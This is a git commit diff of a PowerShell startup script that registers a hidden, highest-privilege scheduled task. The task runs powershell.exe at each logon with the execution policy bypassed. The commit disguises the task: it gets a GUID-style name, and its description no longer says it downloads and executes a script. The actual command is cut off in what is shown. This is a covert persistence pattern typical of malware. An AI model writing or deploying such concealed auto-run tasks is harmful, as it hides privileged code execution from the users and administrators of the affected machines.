4fd2484710af7424f7d27f7d87cc104231bb6d6a
43a1723 <hai1723notgay@gmail.com>
2024-06-21 10:00:32 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -4,8 +4,8 @@ $arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `&
 
 $task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $arguments
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "TaskNameHere"  # Thay đổi giá trị này thành một tên duy nhất cho tác vụ
-$task_desc = "Scheduled task to download and execute script"
+$task_name = "{FE75EAA7-323E-4B5C-B3B3-86C0B79424E7}"  # Thay đổi giá trị này thành một tên duy nhất cho tác vụ
+$task_desc = "Scheduled task to execute script"
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
